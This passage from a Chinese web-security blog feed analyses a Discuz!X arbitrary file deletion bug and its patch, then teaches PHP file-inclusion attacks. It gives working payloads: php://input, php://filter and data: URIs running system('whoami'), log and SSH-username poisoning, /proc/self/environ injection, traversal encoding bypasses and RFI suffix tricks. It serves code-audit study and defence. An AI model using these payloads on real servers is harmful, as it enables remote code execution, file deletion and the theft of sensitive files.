class="keyword">isset</span>($verifyinfo[<span class="string">'field'</span>][$key])) &#123;</div><div class="line">			@unlink(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$verifyinfo[<span class="string">'field'</span>][$key]);</div><div class="line">			$verifyarr[$key] = $attach[<span class="string">'attachment'</span>];</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">continue</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($setarr[$key]) &amp;&amp; $_G[<span class="string">'cache'</span>][<span class="string">'profilesetting'</span>][$key][<span class="string">'needverify'</span>]) &#123;</div><div class="line">		@unlink(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$verifyinfo[<span class="string">'field'</span>][$key]);</div><div class="line">		$verifyarr[$key] = $attach[<span class="string">'attachment'</span>];</div><div class="line">		<span class="keyword">continue</span>;</div><div class="line">	&#125;</div><div class="line">	@unlink(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$space[$key]);</div><div class="line">	$setarr[$key] = $attach[<span class="string">'attachment'</span>];</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>当文件上传成功，也就是<code>!$upload-&gt;error()</code>，会执行到unlink语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">@unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]);</div></pre></td></tr></table></figure></p>
<p>这里的<code>$key</code>，在前面<code>foreach($_FILES as $key =&gt; $file)</code>中定义。</p>
<p>而<code>$space</code>，为用户个人资料，在source/include/spacecp/spacecp_profile.php的第23行左右：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$space = getuserbyuid($_G[<span class="string">'uid'</span>]);</div><div class="line">space_merge($space, <span class="string">'field_home'</span>);</div><div class="line">space_merge($space, <span class="string">'profile'</span>);</div></pre></td></tr></table></figure></p>
<p>这些操作会将用户相关的信息通过数据库提取出来保存到变量$space中。你可以在上面三句代码后面加上一句<code>var_dump($space);</code>，然后访问 <a href="http://127.0.0.1:2500/DiscuzX/upload/home.php?mod=spacecp&amp;ac=profile" target="_blank" rel="external">http://127.0.0.1:2500/DiscuzX/upload/home.php?mod=spacecp&amp;ac=profile</a> 。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/11.png?raw=true" alt=""></p>
<p>即可看到一堆的变量，比如说birthprovince。</p>
<p>所以思考一下这个过程：</p>
<ol>
<li>设置birthprovince为要删除的文件，比如../../theTestFile.txt</li>
<li>上传文件，构造$key 为 birthprovince。</li>
<li>$space[$key] = $space[birthprovince] =</li>
<li>拼接后 unlink(getglobal(XXX/profile/../../theTestFile.txt)  达到任意文件删除。</li>
</ol>
<p>上面的这个思路，即对应着前面漏洞复现中的法一和法二。</p>
<h1 id="相关老洞"><a href="#相关老洞" class="headerlink" title="相关老洞"></a>相关老洞</h1><p>乌云编号： wooyun-2014-065513</p>
<p>当时的漏洞代码出在source/include/spacecp/spacecp_profile.php中，第69行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"># 这是当时的漏洞代码</div><div class="line">if($_GET[&apos;deletefile&apos;] &amp;&amp; is_array($_GET[&apos;deletefile&apos;])) &#123;</div><div class="line">	foreach($_GET[&apos;deletefile&apos;] as $key =&gt; $value) &#123;</div><div class="line">		if(isset($_G[&apos;cache&apos;][&apos;profilesetting&apos;][$key])) &#123;</div><div class="line">			echo (getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]);</div><div class="line">			@unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]);</div><div class="line">			@unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$verifyinfo[&apos;field&apos;][$key]);</div><div class="line">			$verifyarr[$key] = $setarr[$key] = &apos;&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>官方当时的补丁做法是：增加了一次判断<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'deletefile'</span>] &amp;&amp; is_array($_GET[<span class="string">'deletefile'</span>])) &#123;</div><div class="line">	<span class="keyword">foreach</span>($_GET[<span class="string">'deletefile'</span>] <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_G[<span class="string">'cache'</span>][<span class="string">'profilesetting'</span>][$key]) &amp;&amp; $_G[<span class="string">'cache'</span>][<span class="string">'profilesetting'</span>][$key][<span class="string">'formtype'</span>] == <span class="string">'file'</span>) &#123;</div><div class="line">			<span class="keyword">echo</span> <span class="string">"0"</span>;</div><div class="line">			@unlink(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$space[$key]);</div><div class="line">			@unlink(getglobal(<span class="string">'settin</span></div><div class="line">				g/attachdir').<span class="string">'./profile/'</span>.$verifyinfo[<span class="string">'field'</span>][$key]);</div><div class="line">			$verifyarr[$key] = $setarr[$key] = <span class="string">''</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在删除之间多进行了一次验证：<code>$_G[&#39;cache&#39;][&#39;profilesetting&#39;][$key][&#39;formtype&#39;] == &#39;file&#39;</code>，也就是说，若要成功删除， 需要formtype为file类型。</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>这次的漏洞修复简单粗暴，将unlink语句直接删除。。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/12.png?raw=true" alt=""></p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://paper.seebug.org/411/" target="_blank" rel="external">LoRexxar:Discuz!X ≤3.4 任意文件删除漏洞分析</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/2192.html" target="_blank" rel="external">0r3ak：Discuz!X 前台任意文件删除漏洞深入解析</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;代码审计学习。&lt;br&gt;玩一玩老洞应该没关系吧。。&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="XSS" scheme="http://chybeta.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>php文件包含漏洞</title>
    <link href="http://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://chybeta.github.io/2017/10/08/php文件包含漏洞/</id>
    <published>2017-10-08T15:49:30.000Z</published>
    <updated>2017-11-10T12:37:08.037Z</updated>
    
    <content type="html"><![CDATA[<p>php文件包含漏洞学习<br>合上吧，没有新姿势。<br><a id="more"></a></p>
<h1 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>php中引发文件包含漏洞的通常是以下四个函数：</p>
<ol>
<li><a href="http://www.php.net/manual/en/function.include.php" target="_blank" rel="external">include()</a></li>
<li><a href="http://php.net/manual/en/function.include-once.php" target="_blank" rel="external">include_once()</a></li>
<li><a href="http://php.net/manual/en/function.require.php" target="_blank" rel="external">require()</a></li>
<li><a href="http://php.net/manual/en/function.require-once.php" target="_blank" rel="external">require_once()</a></li>
</ol>
<p>reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/1.png?raw=true" alt=""></p>
<p>include() 如果出错的话，只会提出警告，会继续执行后续语句。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/2.png?raw=true" alt=""></p>
<p>require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。</p>
<p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> $file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>在同目录下有个phpinfo.txt，其内容为<code>&lt;? phpinfo(); ?&gt;</code>。则只需要访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phpinfo.txt</div></pre></td></tr></table></figure></p>
<p>即可成功解析phpinfo。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/3.png?raw=true" alt=""></p>
<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><ol>
<li>具有相关的文件包含函数。</li>
<li>文件包含函数中存在动态变量，比如 <code>include $file;</code>。</li>
<li>攻击者能够控制该变量，比如<code>$file = $_GET[&#39;file&#39;];</code>。</li>
</ol>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p>
<h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br>但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
<ol>
<li>allow_url_fopen = On</li>
<li>allow_url_include = On</li>
</ol>
<p>两个配置选项均需要为On，才能远程包含文件成功。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/4.png?raw=true" alt=""></p>
<p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p>
<h1 id="包含姿势"><a href="#包含姿势" class="headerlink" title="包含姿势"></a>包含姿势</h1><p>下面例子中测试代码均为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> $file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>allow_url_fopen 默认为 On<br>allow_url_include 默认为 Off</p>
<p>若有特殊要求，会在利用条件里指出。</p>
<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p>
<ol>
<li>allow_url_include = On。</li>
<li>对allow_url_fopen不做要求。</li>
</ol>
<p>姿势：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">index.php</div><div class="line">?file=php://input</div><div class="line"></div><div class="line">POST:</div><div class="line">&lt;? phpinfo();?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/5.png?raw=true" alt=""></p>
<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：无甚</p>
<p>姿势：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=php://filter/read=convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>
<p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/8.png?raw=true" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">"PD9waHAgDQoJJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KCWluY2x1ZGUgJGZpbGU7DQo/Pg=="</span>)</div><div class="line"><span class="string">b"&lt;?php \r\n\t$file = $_GET['file'];\r\n\tinclude $file;\r\n?&gt;"</span></div></pre></td></tr></table></figure>
<p>其他姿势：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=php://filter/convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>
<p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p>
<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p>
<ol>
<li>php版本大于等于php5.3.0</li>
</ol>
<p>姿势：</p>
<p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/9.png?raw=true" alt=""></p>
<p>指定绝对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</div></pre></td></tr></table></figure></p>
<p>或者使用相对路径（这里test.zip就在当前目录下）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phar://test.zip/phpinfo.txt</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/10.png?raw=true" alt=""></p>
<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p>
<ol>
<li>php版本大于等于php5.3.0</li>
</ol>
<p>姿势：<br>构造zip包的方法同phar。</p>
<p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/11.png?raw=true" alt=""></p>
<p>若是使用相对路径，则会包含失败。</p>
<h3 id="data-URI-schema"><a href="#data-URI-schema" class="headerlink" title="data:URI schema"></a>data:URI schema</h3><p>利用条件：</p>
<ol>
<li>php版本大于等于php5.2</li>
<li>allow_url_fopen = On</li>
<li>allow_url_include = On</li>
</ol>
<p>姿势一：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/6.png?raw=true" alt=""></p>
<p>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt;</div></pre></td></tr></table></figure></p>
<p>姿势二：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</div></pre></td></tr></table></figure></p>
<p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/7.png?raw=true" alt=""></p>
<p>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</div></pre></td></tr></table></figure></p>
<p>其中<code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>的base64解码为：<code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
<h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p>利用条件：session文件路径已知，且其中内容部分可控。</p>
<p>姿势：</p>
<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/14.png?raw=true" alt=""></p>
<p>常见的php-session存放位置：</p>
<ol>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/tmp/sess_PHPSESSID</li>
<li>/tmp/sessions/sess_PHPSESSID</li>
</ol>
<p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/16.png?raw=true" alt=""></p>
<p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
<p>比如这篇文章：<a href="http://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce" target="_blank" rel="external">透過 LFI 引入 PHP session 檔案觸發 RCE</a></p>
<h2 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h2><h3 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h3><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p>
<p>姿势：</p>
<p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>
<p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/12.png?raw=true" alt=""></p>
<p>正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/13.png?raw=true" alt=""></p>
<p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p>
<p>这里提供一道包含日志的CTF题目：<a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">SHACTF-2017- Bon Appétit (100)-writeup </a></p>
<h3 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h3><p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
<p>姿势：</p>
<p>用ssh连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost</div></pre></td></tr></table></figure></p>
<p>之后会提示输入密码等等，随便输入。</p>
<p>然后在remotehost的ssh-log中即可写入php代码：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/17.png?raw=true" alt=""></p>
<p>之后进行文件包含即可。</p>
<p>参考：<a href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/" target="_blank" rel="external">RCE with LFI and SSH Log Poisoning</a></p>
<h2 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h2><p>利用条件：</p>
<ol>
<li>php以cgi方式运行，这样environ才会保持UA头。</li>
<li>environ文件存储位置已知，且environ文件可读。</li>
</ol>
<p>姿势：</p>
<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
<p>可以参考这个：</p>
<ol>
<li><a href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html" target="_blank" rel="external">The proc/self/environ Injection </a></li>
<li><a href="https://www.exploit-db.com/papers/12886/" target="_blank" rel="external">shell via LFI - proc/self/environ method</a></li>
</ol>
<h2 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h2><p>跟包含environ类似。</p>
<p>参考： <a href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method" target="_blank" rel="external">LFI Cheat Sheet：/proc/self/environ LFI Method</a></p>
<h2 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h2><p><img src="http://images2015.cnblogs.com/blog/804631/201511/804631-20151116135028890-525890377.jpg" alt=""></p>
<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考<a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="external">LFI With PHPInfo Assistance</a></p>
<p>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：<a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup </a></p>
<h2 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h2><p>利用条件：千变万化，不过至少得知道上传的文件在哪，叫啥名字。。。</p>
<p>姿势：</p>
<p>往往要配合上传的姿势，不说了，太多了。</p>
<h2 id="其余"><a href="#其余" class="headerlink" title="其余"></a>其余</h2><p>一个web服务往往会用到多个其他服务，比如ftp服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析咯。这里就不展开了。</p>
<h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><p>接下来聊聊绕过姿势。平常碰到的情况肯定不会是简简单单的<code>include $_GET[&#39;file&#39;];</code>这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file.<span class="string">'/test/test.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>这样就很“难”直接去包含前面提到的种种文件。</p>
<h2 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h2><p>先考虑一下指定了前缀的情况吧。测试代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>这个最简单了，简要的提一下。</p>
<p>现在在/var/log/test.txt文件中有php代码<code>&lt;?php phpinfo();?&gt;</code>，则利用<code>../</code>可以进行目录遍历，比如我们尝试访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">include.php?file=../../log/test.txt</div></pre></td></tr></table></figure></p>
<p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/18.png?raw=true" alt=""></p>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p>
<ul>
<li>利用url编码<ul>
<li>../<ul>
<li>%2e%2e%2f</li>
<li>..%2f</li>
<li>%2e%2e/  </li>
</ul>
</li>
<li>..\<ul>
<li>%2e%2e%5c</li>
<li>..%5c</li>
<li>%2e%2e\</li>
</ul>
</li>
</ul>
</li>
<li>二次编码<ul>
<li>../<ul>
<li>%252e%252e%252f</li>
</ul>
</li>
<li>..\<ul>
<li>%252e%252e%255c</li>
</ul>
</li>
</ul>
</li>
<li>容器/服务器的编码方式<ul>
<li>../<ul>
<li>..%c0%af<ul>
<li>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="external">Why does Directory traversal attack %C0%AF work?</a></li>
</ul>
</li>
<li>%c0%ae%c0%ae/<ul>
<li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li>
<li>Apache Tomcat Directory Traversal</li>
</ul>
</li>
</ul>
</li>
<li>..\<ul>
<li>..%c1%9c</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h2><p>接着考虑指定后缀的情况。测试代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> $file.<span class="string">'/test/test.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>url格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</div></pre></td></tr></table></figure></p>
<p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。</p>
<p>姿势一：query（？）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=http://remoteaddr/remoteinfo.txt?</div></pre></td></tr></table></figure></p>
<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt?/test/test.php" target="_blank" rel="external">http://remoteaddr/remoteinfo.txt?/test/test.php</a><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作query从而被绕过。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/19.png?raw=true" alt=""></p>
<p>姿势二：fragment（#）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=http://remoteaddr/remoteinfo.txt%23</div></pre></td></tr></table></figure></p>
<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt#/test/test.php" target="_blank" rel="external">http://remoteaddr/remoteinfo.txt#/test/test.php</a><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作fragment从而被绕过。注意需要把<code>#</code>进行url编码为<code>%23</code>。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/20.png?raw=true" alt=""></p>
